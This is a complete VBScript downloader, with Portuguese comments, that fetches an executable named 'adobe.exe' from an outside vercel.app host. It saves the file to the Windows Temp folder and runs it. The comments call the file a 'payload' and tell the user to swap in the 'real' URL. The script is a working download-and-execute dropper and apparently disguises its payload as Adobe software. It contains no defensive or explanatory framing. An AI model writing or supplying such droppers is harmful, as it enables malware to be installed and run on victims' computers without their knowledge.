Option Explicit

Dim urlExe, destinoExe, http, fso, stream

urlExe = "https://testando123-blond.vercel.app/adobe.exe" ' Altere para a URL real
destinoExe = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\testando.exe" ' Pasta Temp

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", urlExe, False
http.Send

If http.Status = 200 Then
    ' Salvar como binário usando ADODB.Stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binário
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile destinoExe, 2 ' 2 = sobrescrever
    stream.Close
    
    ' Executar o payload
    CreateObject("WScript.Shell").Run Chr(34) & destinoExe & Chr(34), 1, False
Else
    MsgBox "Falha ao baixar o payload: " & http.Status
End If
